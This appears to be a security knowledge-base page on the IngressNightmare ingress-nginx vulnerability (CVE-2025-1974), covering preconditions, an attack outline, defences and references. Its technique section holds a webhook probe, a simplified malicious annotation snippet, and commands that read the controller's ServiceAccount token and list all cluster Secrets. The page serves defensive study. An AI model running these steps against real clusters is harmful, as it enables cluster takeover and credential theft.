---
title: IngressNightmare (ingress-nginx)
slug: k8s-ingressnightmare
---

> **TL;DR:** CVE-2025-1974 — an unauthenticated attacker who can reach the ingress-nginx admission webhook injects arbitrary NGINX directives via crafted annotations, gaining RCE as the controller and full cluster takeover.

## What it is
The ingress-nginx controller's validating admission webhook compiles candidate Ingress objects into a test NGINX config before accepting them, in order to surface syntax errors early. Wiz Research found in early 2025 that several `nginx.ingress.kubernetes.io/*` annotations were rendered into the test config without sufficient sanitisation, letting an attacker include arbitrary directives — including `ssl_engine` style loads or `lua_load_resty_core` paths that read attacker-supplied files. Chained, this becomes pre-auth remote code execution on the controller pod. Because the controller's ServiceAccount typically holds `secrets`, `pods`, and namespace-spanning read across the cluster, "RCE on the controller" is "RCE on the cluster."

## Preconditions / where it applies
- ingress-nginx versions prior to the March 2025 patches (1.11.5 / 1.12.1 et al.).
- Attacker can send an `AdmissionReview` request to the validating webhook — by default the Service is in-cluster only, but plenty of clusters expose it via misconfigured NetworkPolicy, hostNetwork pods, or the webhook reachable from any namespace.
- No `enable-annotation-validation` lockdown; default `--allow-snippet-annotations` configurations are most exposed.

## Technique
1. Locate the admission webhook Service (`ingress-nginx-controller-admission`, port 443).
2. Send a crafted AdmissionReview POST with an Ingress carrying poisoned annotations.
3. Annotations cause the controller's test NGINX run to load attacker-controlled config, executing code in the controller's container.

```bash
# Probe the webhook from a pod that can reach the controller namespace
kubectl run probe --image=curlimages/curl --restart=Never -- \
  curl -sk https://ingress-nginx-controller-admission.ingress-nginx.svc/networking/v1/ingresses
```

```yaml
# Simplified: malicious annotation values that render into the test config
metadata:
  annotations:
    nginx.ingress.kubernetes.io/auth-url: "http://x"
    nginx.ingress.kubernetes.io/configuration-snippet: |
      ssl_engine /proc/self/fd/0;
      # crafted directives that pull in attacker-controlled config
```

```bash
# After RCE on the controller pod — exfil the ServiceAccount token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use it to read every Secret in the cluster
kubectl --token=$T --server=https://kubernetes.default get secrets -A
```

Wiz's PoC details several CVEs that compose into the unauth-RCE chain (CVE-2025-1097, -1098, -1974, -24513, -24514).

## Detection and defence
- Patch to ingress-nginx 1.11.5 / 1.12.1 or later; treat snippet annotations as deprecated and set `--allow-snippet-annotations=false`.
- NetworkPolicy: block ingress to the admission webhook from anything except the kube-apiserver.
- Audit logging on `admissionregistration.k8s.io` and on Ingress object create/update with snippet annotations.
- Consider migrating to alternative controllers (Cilium, Gateway API implementations) where validation surface is smaller.
- Related: [[k8s-rbac-abuse]], [[k8s-etcd-attacks]].

## References
- [Wiz — IngressNightmare: 9.8 critical unauthenticated RCE in ingress-nginx](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities) — full chain analysis and PoC overview.
- [Kubernetes Security Advisory GHSA-pmrf-7p3w-7xx4 (CVE-2025-1974)](https://github.com/kubernetes/ingress-nginx/security/advisories/GHSA-pmrf-7p3w-7xx4) — vendor advisory and fixed versions.
